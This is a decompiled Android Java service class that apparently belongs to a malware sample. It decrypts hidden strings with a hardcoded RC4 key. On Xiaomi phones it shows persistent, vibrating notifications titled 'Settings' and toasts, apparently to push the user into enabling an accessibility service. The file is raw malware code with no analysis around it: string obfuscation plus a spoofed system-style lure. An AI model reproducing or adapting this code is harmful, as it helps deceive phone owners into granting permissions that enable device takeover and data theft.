/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.Notification$BigTextStyle
 *  android.app.Notification$Builder
 *  android.app.Notification$Style
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.PendingIntent
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.content.res.Resources
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.IBinder
 *  android.util.Base64
 *  android.widget.Toast
 */
package com.example.mmm.Service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.widget.Toast;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;
import com.example.mmm.mainActivity;

public class srvToaskAccessibility
extends Service {
    utils promote$ = new utils();
    constants settled$ = new constants();

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    private void a(Context context, String string) {
        if (Build.VERSION.SDK_INT <= 25) return;
        NotificationManager notificationManager = (NotificationManager)context.getSystemService("notification");
        PendingIntent pendingIntent = PendingIntent.getActivity((Context)context, (int)0, (Intent)new Intent((Context)this, mainActivity.class), (int)0);
        String string2 = "channel_1";
        String string3 = "Xiaomi";
        Object object = new NotificationChannel(string2, (CharSequence)"123", 4);
        object.setDescription(string3);
        object.enableLights(true);
        object.setLightColor(-65536);
        object.enableVibration(true);
        object.setVibrationPattern(new long[]{1500L, 1500L, 1500L, 1500L, 1500L});
        object.setShowBadge(false);
        notificationManager.createNotificationChannel((NotificationChannel)object);
        string2 = new Notification.Builder(context, string2).setContentTitle((CharSequence)"Title");
        string3 = context.getResources();
        object = new StringBuilder();
        ((StringBuilder)object).append(context.getPackageName());
        ((StringBuilder)object).append(":mipmap/ic_launcher");
        context = string2.setSmallIcon(string3.getIdentifier(((StringBuilder)object).toString(), null, null)).setContentTitle((CharSequence)"Settings").setContentText((CharSequence)string).setVibrate(new long[]{1500L, 1500L, 1500L, 1500L, 1500L}).setCategory("msg").setStyle((Notification.Style)new Notification.BigTextStyle().bigText((CharSequence)string)).setAutoCancel(false).setContentIntent(pendingIntent).setDefaults(2).setDefaults(1).setDefaults(4).build();
        context.flags |= 16;
        notificationManager.notify(1, (Notification)context);
    }

    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("");
    }

    public int onStartCommand(Intent object, int n2, int n3) {
        utils utils3 = new utils();
        if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER)) {
            if (utils.getMiuiVersion() >= 11) {
                object = new StringBuilder();
                ((StringBuilder)object).append(utils3._ranch());
                ((StringBuilder)object).append(utils3._numbers());
                object = Toast.makeText((Context)this, (CharSequence)((StringBuilder)object).toString(), (int)1);
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append(utils3._ranch());
                stringBuilder.append(utils3._numbers());
                this.a((Context)this, stringBuilder.toString());
            } else if (utils.getMiuiVersion() == 10) {
                object = Toast.makeText((Context)this, (CharSequence)utils3._numbers(), (int)1);
                this.a((Context)this, utils3._numbers());
            } else {
                object = Toast.makeText((Context)this, (CharSequence)utils3._numbers(), (int)1);
            }
        } else {
            object = Toast.makeText((Context)this, (CharSequence)utils3._numbers(), (int)1);
        }
        object.show();
        this.stopSelf();
        return n2;
    }
}

